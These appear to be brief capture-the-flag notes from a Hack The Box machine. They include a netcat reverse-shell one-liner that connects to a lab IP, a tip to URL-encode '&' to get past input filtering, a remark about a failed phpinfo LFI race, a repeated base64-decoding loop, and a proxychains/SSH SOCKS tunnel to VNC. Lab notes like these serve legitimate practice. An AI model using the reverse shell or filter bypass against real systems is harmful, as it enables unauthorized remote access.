### Use %26 encode to pass the & filtering
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.9 4242 >/tmp/f
```

### phpinfolfi.py
Didn't make it work on HTB vip+

Too slow to win the race.

### Bash script
```
data=$(cat pw64.txt); for i in $(seq 1 13); do data=$(echo $data | tr -d ' ' | base64 -d); done; echo $data
```
### SOCKS5 for SSH
```
socks5 127.0.0.1 1080                                                                                                                                                                                             
❯ proxychains vncviewer 127.0.0.1::5901 -passwd secret

~C -D 1080 instead of -L 5901:127.0.0.1:5901
```
